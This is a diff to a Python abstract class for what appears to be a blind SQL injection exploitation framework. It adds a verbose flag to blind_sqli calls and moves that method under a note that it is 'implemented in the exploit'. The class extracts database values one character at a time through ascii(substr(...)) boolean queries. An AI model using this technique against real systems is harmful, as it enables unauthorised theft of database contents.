@@ -22,7 +22,7 @@ class SQLi(ABC):
 
         if not binary_search:
             cur_int = 1
-            while self.blind_sqli(f"({query})>{cur_int}"):
+            while self.blind_sqli(f"({query})>{cur_int}", verbose):
                 cur_int += 1
 
             return cur_int
@@ -30,16 +30,15 @@ class SQLi(ABC):
             min_value = 1
             max_value = 1
 
-            while self.blind_sqli(f"({query})>{max_value}"):
+            while self.blind_sqli(f"({query})>{max_value}", verbose):
                 min_value = max_value + 1
                 max_value = max_value * 2
 
-            max_value = max_value - 1
             while True:
                 cur_int = (min_value + max_value) // 2
-                if self.blind_sqli(f"({query})>{cur_int}"):
+                if self.blind_sqli(f"({query})>{cur_int}", verbose):
                     min_value = cur_int + 1
-                elif self.blind_sqli(f"({query})<{cur_int}"):
+                elif self.blind_sqli(f"({query})<{cur_int}", verbose):
                     max_value = cur_int - 1
                 else:
                     return cur_int
@@ -67,7 +66,7 @@ class SQLi(ABC):
             found = False
             query = self.build_query(f"ascii(substr({column},{len(cur_str) + 1},1))", table, condition, offset)
             for c in charset:
-                if self.blind_sqli(f"({query})={ord(c)}"):
+                if self.blind_sqli(f"({query})={ord(c)}", verbose):
                     found = True
                     cur_str += c
                     if verbose:
@@ -93,6 +92,12 @@ class SQLi(ABC):
 
         return rows
 
+    # Following methods need to be implemented in the exploit
+    @abstractmethod
+    def blind_sqli(self, condition: str, verbose=False) -> bool:
+        pass
+
+    # Following methods will be implemented by MySQLi, PostgreSQLi, ...
     @abstractmethod
     def get_database_version(self, verbose=False):
         pass
@@ -103,10 +108,6 @@ class SQLi(ABC):
 
     @abstractmethod
     def get_current_database(self, verbose=False):
-        pass
-
-    @abstractmethod
-    def blind_sqli(self, condition: str, verbose=False) -> bool:
         pass
 
     @abstractmethod
